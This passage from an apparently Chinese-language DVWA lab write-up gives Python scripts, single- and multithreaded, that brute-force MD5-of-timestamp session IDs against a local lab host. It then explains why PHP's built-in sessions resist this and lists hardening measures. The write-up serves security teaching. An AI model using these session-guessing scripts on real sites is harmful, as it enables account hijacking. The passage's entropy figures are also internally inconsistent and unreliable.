class="number">300</span>):</span><br><span class="line">    timestamp = current + offset</span><br><span class="line">    md5_hash = hashlib.md5(<span class="built_in">str</span>(timestamp).encode()).hexdigest()</span><br><span class="line">    md5_dict[md5_hash] = timestamp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在有了MD5 → 时间戳的映射</span></span><br><span class="line"><span class="comment"># 可以用这个字典枚举Session ID</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法：预计算MD5字典"><a href="#方法：预计算MD5字典" class="headerlink" title="方法：预计算MD5字典"></a>方法：预计算MD5字典</h4><p><strong>完整攻击脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/weak_id/&quot;</span></span><br><span class="line">cookies_base = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;high&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;你的PHPSESSID&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时间</span></span><br><span class="line">current_time = <span class="built_in">int</span>(time.time())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Generating MD5 dictionary...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成前后10分钟的MD5字典（600秒）</span></span><br><span class="line">md5_list = []</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">600</span>, <span class="number">600</span>):</span><br><span class="line">    timestamp = current_time + offset</span><br><span class="line">    md5_hash = hashlib.md5(<span class="built_in">str</span>(timestamp).encode()).hexdigest()</span><br><span class="line">    md5_list.append((md5_hash, timestamp))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Generated <span class="subst">&#123;<span class="built_in">len</span>(md5_list)&#125;</span> MD5 hashes&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Testing Session IDs...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举测试</span></span><br><span class="line"><span class="keyword">for</span> md5_hash, timestamp <span class="keyword">in</span> md5_list:</span><br><span class="line">    cookies = cookies_base.copy()</span><br><span class="line">    cookies[<span class="string">&#x27;dvwaSession&#x27;</span>] = md5_hash</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, cookies=cookies)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;valid&quot;</span> <span class="keyword">in</span> response.text.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Found valid session!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    Session ID: <span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    Timestamp: <span class="subst">&#123;timestamp&#125;</span> (<span class="subst">&#123;time.ctime(timestamp)&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 避免请求太快</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>优化：多线程</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">q, results</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            md5_hash, timestamp = q.get(timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            cookies = cookies_base.copy()</span><br><span class="line">            cookies[<span class="string">&#x27;dvwaSession&#x27;</span>] = md5_hash</span><br><span class="line"></span><br><span class="line">            response = requests.get(url, cookies=cookies)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;valid&quot;</span> <span class="keyword">in</span> response.text.lower():</span><br><span class="line">                results.append((md5_hash, timestamp))</span><br><span class="line"></span><br><span class="line">            q.task_done()</span><br><span class="line">        <span class="keyword">except</span> queue.Empty:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建队列和线程</span></span><br><span class="line">q = queue.Queue()</span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加任务到队列</span></span><br><span class="line"><span class="keyword">for</span> md5_hash, timestamp <span class="keyword">in</span> md5_list:</span><br><span class="line">    q.put((md5_hash, timestamp))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动10个线程</span></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=worker, args=(q, results))</span><br><span class="line">    t.start()</span><br><span class="line">    threads.append(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待完成</span></span><br><span class="line">q.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Found <span class="subst">&#123;<span class="built_in">len</span>(results)&#125;</span> valid sessions&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>使用PHP内置的安全Session机制，无法预测。</p>
<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 使用PHP内置的Session机制 ★★★</span></span><br><span class="line"><span class="comment">// session_start() - 启动或恢复会话</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// PHP会：</span></span><br><span class="line"><span class="comment">// 1. 生成强随机的Session ID（使用CSPRNG）</span></span><br><span class="line"><span class="comment">// 2. Session ID长度：32字符（128位熵）</span></span><br><span class="line"><span class="comment">// 3. 使用字母数字：0-9, a-z（36个字符）</span></span><br><span class="line"><span class="comment">// 4. 总可能性：36^32 ≈ 6.3 × 10^49</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 例如：</span></span><br><span class="line"><span class="comment">// PHPSESSID = &quot;a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 特点：</span></span><br><span class="line"><span class="comment">// - 密码学安全的随机数生成器</span></span><br><span class="line"><span class="comment">// - 高熵值（128位）</span></span><br><span class="line"><span class="comment">// - 完全不可预测</span></span><br><span class="line"><span class="comment">// - 暴力破解在计算上不可行</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 获取Session ID ★★★</span></span><br><span class="line"><span class="comment">// session_id() - 返回当前Session ID</span></span><br><span class="line"><span class="comment">// 这个ID是由PHP自动生成和管理的</span></span><br><span class="line"><span class="variable">$cookie_value</span> = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>PHP Session ID特性：</strong></p>
<ol>
<li><p><strong>强随机性</strong></p>
<ul>
<li>使用CSPRNG（密码学安全伪随机数生成器）</li>
<li>不可预测</li>
</ul>
</li>
<li><p><strong>高熵值</strong></p>
<ul>
<li>32字符长度</li>
<li>128位熵</li>
<li>36^32种可能性</li>
</ul>
</li>
<li><p><strong>自动管理</strong></p>
<ul>
<li>PHP自动处理Session</li>
<li>安全的默认配置</li>
</ul>
</li>
<li><p><strong>安全选项</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以进一步加强</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.cookie_httponly&#x27;</span>, <span class="number">1</span>);  <span class="comment">// HttpOnly</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.cookie_secure&#x27;</span>, <span class="number">1</span>);    <span class="comment">// Secure</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.use_only_cookies&#x27;</span>, <span class="number">1</span>); <span class="comment">// 只使用Cookie</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.cookie_samesite&#x27;</span>, <span class="string">&#x27;Strict&#x27;</span>); <span class="comment">// SameSite</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>暴力破解计算：</strong></p>
<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">Session ID长度：</span><span class="number">32</span><span class="language-xml">字符</span></span><br><span class="line"><span class="language-xml">字符集：</span><span class="number">0</span><span class="number">-9</span><span class="language-xml">, a-z（</span><span class="number">36</span><span class="language-xml">个字符）</span></span><br><span class="line"><span class="language-xml">可能性：</span><span class="number">36</span><span class="keyword">^32</span><span class="language-xml"> ≈ </span><span class="number">6.3</span><span class="language-xml"> × </span><span class="number">10</span><span class="keyword">^49</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">假设：</span></span><br><span class="line"><span class="language-xml">- 每秒测试</span><span class="number">100</span><span class="language-xml">万个Session ID</span></span><br><span class="line"><span class="language-xml">- 需要时间：</span><span class="number">6.3</span><span class="language-xml"> × </span><span class="number">10</span><span class="keyword">^49</span><span class="language-xml"> / </span><span class="number">10</span><span class="keyword">^6</span><span class="language-xml"> ≈ </span><span class="number">6.3</span><span class="language-xml"> × </span><span class="number">10</span><span class="keyword">^43</span><span class="language-xml"> 秒</span></span><br><span class="line"><span class="language-xml">- 转换为年：≈ </span><span class="number">2</span><span class="language-xml"> × </span><span class="number">10</span><span class="keyword">^36</span><span class="language-xml"> 年</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">宇宙年龄：约 </span><span class="number">1.4</span><span class="language-xml"> × </span><span class="number">10</span><span class="keyword">^10</span><span class="language-xml"> 年</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">暴力破解在计算上完全不可行！</span></span><br></pre></td></tr></table></figure>

<p><strong>所有攻击都失败：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">尝试<span class="number">1</span>：枚举连续数字</span><br><span class="line">结果：<span class="keyword">Session</span> ID不是数字，是随机字符串</span><br><span class="line"></span><br><span class="line">尝试<span class="number">2</span>：基于时间预测</span><br><span class="line">结果：<span class="keyword">Session</span> ID与时间无关</span><br><span class="line"></span><br><span class="line">尝试<span class="number">3</span>：MD5字典</span><br><span class="line">结果：<span class="keyword">Session</span> ID不是基于简单哈希</span><br><span class="line"></span><br><span class="line">尝试<span class="number">4</span>：暴力破解</span><br><span class="line">结果：计算上不可行（需要宇宙年龄的<span class="number">10</span>^<span class="number">26</span>倍）</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-使用PHP内置Session（推荐）"><a href="#1-使用PHP内置Session（推荐）" class="headerlink" title="1. 使用PHP内置Session（推荐）"></a>1. 使用PHP内置Session（推荐）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 启动Session</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// PHP会自动生成安全的Session ID</span></span><br><span class="line"><span class="variable">$session_id</span> = <span class="title function_ invoke__">session_id</span>();</span><br></pre></td></tr></table></figure>

<h4 id="2-配置Session安全选项"><a href="#2-配置Session安全选项" class="headerlink" title="2. 配置Session安全选项"></a>2. 配置Session安全选项</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php.ini 或运行时配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用HttpOnly（防止JavaScript读取）</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.cookie_httponly&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Secure（只通过HTTPS传输）</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.cookie_secure&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只使用Cookie（不在URL中传递）</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.use_only_cookies&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止透明Session ID</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.use_trans_sid&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SameSite属性（防CSRF）</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.cookie_samesite&#x27;</span>, <span class="string">&#x27;Strict&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Session名称（不使用默认PHPSESSID）</span></span><br><span class="line"><span class="title function_ invoke__">session_name</span>(<span class="string">&#x27;MyApp_Session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义Session保存路径</span></span><br><span class="line"><span class="title function_ invoke__">session_save_path</span>(<span class="string">&#x27;/path/to/secure/directory&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="3-定期更新Session-ID"><a href="#3-定期更新Session-ID" class="headerlink" title="3. 定期更新Session ID"></a>3. 定期更新Session ID</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 登录后更新Session ID（防Session Fixation）</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user_authenticated</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_regenerate_id</span>(<span class="literal">true</span>); <span class="comment">// true表示删除旧Session</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 敏感操作前更新</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$critical_operation</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_regenerate_id</span>(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-添加额外的安全检查"><a href="#4-添加额外的安全检查" class="headerlink" title="4. 添加额外的安全检查"></a>4. 添加额外的安全检查</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定到IP地址（可选，可能影响移动用户）</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;ip&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;ip&#x27;</span>] !== <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">    <span class="comment">// IP changed, destroy session</span></span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Session hijacking detected&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定到User-Agent</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_agent&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_agent&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_agent&#x27;</span>] !== <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Session hijacking detected&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Session超时</span></span><br><span class="line"><span class="variable">$timeout</span> = <span class="number">30</span> * <span class="number">60</span>; <span class="comment">// 30分钟</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_activity&#x27;</span>]) &amp;&amp;</span><br><span class="line">    (<span class="title function_ invoke__">time</span>() - <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_activity&#x27;</span>]) &gt; <span class="variable">$timeout</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Session expired&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;last_activity&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br></pre></td></tr></table></figure>

<h4 id="5-自定义Session-ID生成器（高级）"><a href="#5-自定义Session-ID生成器（高级）" class="headerlink" title="5. 自定义Session ID生成器（高级）"></a>5. 自定义Session ID生成器（高级）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果需要自定义Session ID</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_secure_session_id</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 使用random_bytes()生成强随机数</span></span><br><span class="line">    <span class="variable">$random_bytes</span> = <span class="title function_ invoke__">random_bytes</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换为十六进制字符串</span></span><br><span class="line">    <span class="variable">$session_id</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$random_bytes</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$session_id</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置自定义ID</span></span><br><span class="line"><span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">generate_secure_session_id</span>());</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br></pre></td></tr></table></figure>

<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="Laravel示例"><a href="#Laravel示例" class="headerlink" title="Laravel示例"></a>Laravel示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Laravel自动管理Session，非常安全</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置文件：config/session.php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;database&#x27;</span>, <span class="comment">// 或 &#x27;redis&#x27;, &#x27;memcached&#x27;</span></span><br><span class="line">    <span class="string">&#x27;lifetime&#x27;</span> =&gt; <span class="number">120</span>,</span><br><span class="line">    <span class="string">&#x27;expire_on_close&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;encrypt&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;http_only&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;secure&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&#x27;same_site&#x27;</span> =&gt; <span class="string">&#x27;strict&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="title function_ invoke__">session</span>([<span class="string">&#x27;key&#x27;</span> =&gt; <span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">session</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新Session ID</span></span><br><span class="line"><span class="title function_ invoke__">session</span>()-&gt;<span class="title function_ invoke__">regenerate</span>();</span><br></pre></td></tr></table></figure>

<h3 id="监控和日志"><a href="#监控和日志" class="headerlink" title="监控和日志"></a>监控和日志</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录Session活动</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log_session_activity</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = [</span><br><span class="line">        <span class="string">&#x27;session_id&#x27;</span> =&gt; <span class="title function_ invoke__">session_id</span>(),</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span> =&gt; <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] ?? <span class="string">&#x27;anonymous&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>(),</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">        <span class="string">&#x27;session_log.txt&#x27;</span>,</span><br><span class="line">        <span class="title function_ invoke__">json_encode</span>(<span class="variable">$log</span>) . <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        FILE_APPEND</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>生成方式</td>
<td>递增计数器</td>
<td>时间戳</td>
<td>MD5(时间戳)</td>
<td>PHP Session</td>
</tr>
<tr>
<td>可预测性</td>
<td>完全可预测</td>
<td>高度可预测</td>
<td>可预测</td>
<td>不可预测</td>
</tr>
<tr>
<td>熵值</td>
<td>极低</td>
<td>低</td>
<td>中</td>
<td>高（128位）</td>
</tr>
<tr>
<td>长度</td>
<td>1-4位</td>
<td>10位</td>
<td>32字符</td>
